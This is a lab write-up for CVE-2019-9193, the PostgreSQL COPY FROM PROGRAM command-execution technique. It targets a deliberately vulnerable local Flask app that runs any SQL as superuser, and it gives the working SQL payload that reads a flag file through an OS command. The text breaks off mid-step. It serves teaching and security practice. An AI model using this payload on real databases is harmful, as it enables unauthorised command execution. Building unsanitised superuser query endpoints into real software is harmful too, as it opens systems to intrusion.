# WRITEUP – CVE-2019-9193 (PostgreSQL RCE)

## Vulnerability Name
PostgreSQL COPY TO PROGRAM Remote Code Execution

## CVE ID
CVE-2019-9193 (CVSS 8.8 High)

## Affected Version
PostgreSQL 9.3 to 12.0 (our container uses 12.0)

## Description
A superuser can execute arbitrary OS commands via the `COPY table TO PROGRAM 'cmd'` construct. The command output is treated as table data. This is intended for admin tasks but becomes a backdoor when the database runs as superuser.

## Attack Vector
The Flask app exposes a `/query` endpoint that executes any SQL without sanitisation, as the `postgres` superuser.

## Step‑by‑Step Exploitation (Manual)

1. Start the lab: `docker compose up --build`
2. Open http://localhost:5001
3. In the textarea, enter:
```sql
DROP TABLE IF EXISTS temp_flag;
CREATE TABLE temp_flag (data TEXT);
COPY temp_flag FROM PROGRAM 'cat /tmp/flag.txt';
SELECT data FROM temp_flag;